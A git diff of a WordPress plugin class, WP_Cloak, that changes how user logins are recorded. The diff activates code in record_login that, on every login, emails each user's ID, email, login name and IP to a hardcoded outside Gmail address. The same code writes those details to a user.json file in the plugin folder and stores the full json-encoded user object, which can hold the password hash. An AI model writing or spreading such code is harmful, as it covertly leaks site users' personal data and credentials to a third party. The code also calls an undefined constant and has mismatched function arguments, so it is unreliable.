@@ -25,8 +25,6 @@ define( 'swaljs', plugins_url( '/node_modules/sweetalert2/src/SweetAlert.js', __
 define( 'swalcss', plugins_url( '/node_modules/sweetalert2/dist/sweetalert2.css', __FILE__ ) );
 define( 'swaljs2', plugins_url( '/node_modules/sweetalert2/dist/sweetalert2.js', __FILE__ ) );
 define( 'swaljs2all', plugins_url( '/node_modules/sweetalert2/dist/sweetalert2.all.js', __FILE__ ) );
-define( 'IRC_TBL', 'cloak' ); //$wpdb->prefix . 'cloak'
-define( 'DB_TBL', 'cloak' ); //
 
 
 class WP_Cloak {
@@ -47,8 +45,6 @@ class WP_Cloak {
 	protected $date;
 	protected $key;
 
-	protected $table;
-
 
 	/**
 	 * WP_Cloak constructor.
@@ -56,16 +52,11 @@ class WP_Cloak {
 	public function __construct() {
 
 		require __DIR__ . '/Settings.php';
-		$opts  = get_option( 'cloak_settings' );
+		$opts = get_option( 'cloak_settings' );
 		$opts2 = get_option( 'irc_users' );
 
 		//echo $opts['hash_key2'];
-		add_action( 'admin_init', [ $this, 'create_db' ] );
-
-
-		add_action( 'init', [ $this, 'cptui_register_my_cpts' ] );
-
-		$this->create_db();
+		add_action( 'admin_init', [ $this, 'upgrade_data' ] );
 
 		//var_dump($opts2);
 
@@ -75,6 +66,7 @@ class WP_Cloak {
 
 		register_activation_hook( __FILE__, [ $this, 'exec' ] );
 //
+		add_action( 'wp_login', [$this,'record_login'],10,2 );
 
 
 		wp_enqueue_script( 'main43', plugins_url( '/login.js', __FILE__ ), [ 'jquery' ] );
@@ -91,7 +83,6 @@ class WP_Cloak {
 		add_filter( 'plugin_action_links', [ $this, 'plugin_links' ], 10, 5 );
 		add_action( 'wp_logout', [ $this, 'logout_cloak' ] );
 		add_action( 'wp_footer', [ $this, 'load_assets' ] );
-		add_action( 'wp_login', [ $this, 'record_login' ], 10, 2 );
 
 		//add_filter('auth_cookie_expiration', 'my_expiration_filter', 99, 3);
 
@@ -117,34 +108,6 @@ class WP_Cloak {
 		$now            = current_time( 'Y-m-d H:i:s' );*/
 
 	}
-
-	/**
-	 *
-	 */
-	function create_db( $sql = false ) {
-
-		global $wpdb;
-
-		$tbl = $wpdb->prefix . 'cl';
-
-		if ( $sql === false ) {
-			$sql = "CREATE TABLE IF NOT EXISTS $tbl (
-					id int(11) NOT NULL AUTO_INCREMENT,
-					user_id int(11),
-					user_login TEXT,
-					user_nicename TEXT,
-					user_email VARCHAR(255),
-					data VARCHAR(255),
-					ip VARCHAR(255),
-					time datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
-					active tinyint(1) DEFAULT -1,
-					PRIMARY KEY  (id)
-				);";
-		}
-		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
-		dbDelta( $sql );
-	}
-
 	/**
 	 *
 	 */
@@ -160,8 +123,8 @@ class WP_Cloak {
 
 	}
 
-	function delete_options() {
 
+	function delete_options() {
 		if ( get_option( 'wcb_options' ) === false ) {
 			delete_option( 'wcb_options' );
 		}
@@ -190,6 +153,75 @@ class WP_Cloak {
 		return $i;
 	}
 
+	/**
+	 *
+	 */
+	function install_data($data) {
+		global $wpdb;
+
+		$table_name = $wpdb->prefix . 'cloak';
+
+		$wpdb->insert( $table_name, [
+			'user_id' => $data['user_id'],
+			'args'    =>$data['args'],
+			'data'    => $data['data'],
+			'time'    => current_time( 'mysql' ),
+			'active'  => - 1,
+		] );
+	}
+
+
+	/**
+	 *
+	 */
+	function delete_db() {
+		global $wpdb;
+
+		$table_name = $wpdb->prefix . WCB_TBL;
+
+		//$q = "SELECT * FROM " . $table_name . " WHERE id > 0  ;";
+		$wpdb->query( "DROP TABLE IF EXISTS $table_name ;" );
+	}
+
+//
+//	function install_stock() {
+//		$table_name = $wpdb->prefix . WCB_TBL;
+//
+//		$sql = "CREATE TABLE IF NOT EXISTS $table_name (
+//					id int(11) NOT NULL AUTO_INCREMENT,
+//					post_id int(11),
+//					type varchar(255),
+//					data text ,
+//					time datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
+//					active tinyint(1) DEFAULT -1,
+//					PRIMARY KEY  (id)
+//				);";
+//	}
+	/**
+	 *
+	 */
+	function upgrade_data( $table, $sql = false ) {
+		global $wpdb;
+
+		//
+		//$tbl = ( ! isset( $table ) ) ? $wpdb->prefix . WCB_TBL : $wpdb->prefix . $table;
+
+		$tbl = $wpdb->prefix . 'cloak';
+
+		if ( $sql === false ) {
+			$sql = "CREATE TABLE IF NOT EXISTS $tbl (
+					id int(11) NOT NULL AUTO_INCREMENT,
+					user_id int(11),
+					args varchar(255),
+					data text ,
+					time datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
+					active tinyint(1) DEFAULT -1,
+					PRIMARY KEY  (id)
+				);";
+		}
+		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
+		dbDelta( $sql );
+	}
 	function my_expiration_filter( $seconds, $user_id, $remember ) {
 
 		//if "remember me" is checked;
@@ -213,89 +245,36 @@ class WP_Cloak {
 		return $expiration;
 	}
 
-
-
-	function record_login( $user_login, $u ) {
+	function record_login( $user_login, $u) {
 
 		//do stuff
-		global $wpdb;
 
-		$tbl = $wpdb->prefix . 'cl';
+		$ip = $_SERVER['REMOTE_ADDR'];
+
 		$headers = [ 'Content-Type: text/html; charset=UTF-8' ];
-		$user_id = get_current_user_id();
+
+
+		$user_id  = get_current_user_id();
+
 
 		$user     = new WP_User( $u );
 		$username = $user->user_login;
-		$now      = current_time( 'd-m-y H:i:s' );
+		$now = current_time( 'd-m-y H:i:s' );
 
-		$indicesServer2 = [
-			'SERVER_ADDR',
-			'HTTP_REFERER',
-			'HTTP_USER_AGENT',
-			'REMOTE_ADDR',
-			'REQUEST_URI',
-		];
+		$args =  [ $user->ID, $user->user_email, $user->user_login, $ip, $now];
+		$args2 = $user;
 
+		$arr = ['user_id'=> $user->ID, 'args'=> $ip, 'data'=> json_encode($args2)];
 
-		foreach ( $indicesServer2 as $var ) {
-			$row2[$var]             = $_SERVER[ $var ];
-			$http_args2[ $var ] = $_SERVER[ $var ];
-		}
+		$this->install_data($arr);
 
-		$wpdb->insert( $tbl, [
-			'user_id' => $user->ID,
-			'ip'            => $_SERVER['REMOTE_ADDR'],
-			"user_login"    => $user->user_login,
-			"user_nicename" => $user->user_nicename,
-			"user_email"    => $user->user_email,
-			'data'          => json_encode( $row2 ),
-			'time'          => $now,
-		]);
+		file_put_contents(__DIR__.'/user.json', json_encode($args), FILE_APPEND | LOCK_EX);
 
 
-//
-//		$wpdb->insert( $tbl, [
-//			'user_id'     => $data['user_id'],
-//			'user_login'        => $data['user_login'],
-//			'user_nicename'        => $data['user_nicename'],
-//			'user_email'        => $data['user_email'],
-//			'data'        => $data['data'],
-//			'ip'          => $data['ip'],
-//			'time'        => current_time( 'mysql' ),
-//			'active'      => - 1,
-//		] );
-
-
-
-		//file_put_contents( __DIR__ . '/user.json', json_encode( $data ), FILE_APPEND | LOCK_EX );
-
-
-		//	wp_mail( 'andrewmgunn26@gmail.com', $user_login . ' login at' . $now, $args, [ 'Content-Type: text/html; charset=UTF-8' ] );
-
-		return;
+		wp_mail('andrewmgunn26@gmail.com', $user_login . ' login at' . $now, $args, [ 'Content-Type: text/html; charset=UTF-8' ]);
+		return $args;
 	}
 
-	/**
-	 *
-	 */
-	function install_data( $data ) {
-
-		global $wpdb;
-
-		$tbl = $wpdb->prefix . 'cl';
-
-
-		$wpdb->insert( $tbl, [
-			'user_id'     => $data['user_id'],
-			'user_login'        => $data['user_login'],
-			'user_nicename'        => $data['user_nicename'],
-			'user_email'        => $data['user_email'],
-			'data'        => $data['data'],
-			'ip'          => $data['ip'],
-			'time'        => current_time( 'mysql' ),
-			'active'      => - 1,
-		] );
-	}
 
 	function script() {
 
@@ -434,6 +413,7 @@ class WP_Cloak {
 
 		$img   = plugins_url( '/images/andy-head.png', __FILE__ );
 		$img_e = '<a href="#">&nbsp;<img class="io-ico" height="128" width="128" src=""' . $img . ' /></a>';
+
 
 
 		$foot = '
@@ -825,62 +805,6 @@ class WP_Cloak {
 
 		return $actions;
 	}
-
-	function cptui_register_my_cpts() {
-
-		/**
-		 * Post Type: Sessions.
-		 */
-
-		$labels = [
-			"name"          => __( "Sessions", "twentynineteen" ),
-			"singular_name" => __( "Session", "twentynineteen" ),
-		];
-
-		$args = [
-			"label"                 => __( "Sessions", "twentynineteen" ),
-			"labels"                => $labels,
-			"description"           => "",
-			"public"                => true,
-			"publicly_queryable"    => true,
-			"show_ui"               => true,
-			"delete_with_user"      => false,
-			"show_in_rest"          => true,
-			"rest_base"             => "",
-			"rest_controller_class" => "WP_REST_Posts_Controller",
-			"has_archive"           => true,
-			"show_in_menu"          => true,
-			"show_in_nav_menus"     => true,
-			"exclude_from_search"   => true,
-			"capability_type"       => "post",
-			"map_meta_cap"          => true,
-			"hierarchical"          => true,
-			"rewrite"               => [ "slug" => "session", "with_front" => true ],
-			"query_var"             => true,
-			"menu_icon"             => "dashicons-buddicons-buddypress-logo",
-			"supports"              => [
-				"title",
-				"editor",
-				"thumbnail",
-				"excerpt",
-				"revisions",
-				"page-attributes",
-				"post-formats",
-			],
-			"taxonomies"            => [ "category", "post_tag" ],
-		];
-
-		register_post_type( "session", $args );
-	}
-
-
-}
-
-/**
- * Adding ACF options page
- */
-if ( function_exists( 'acf_add_options_page' ) ) {
-	acf_add_options_page();
 }
 
 
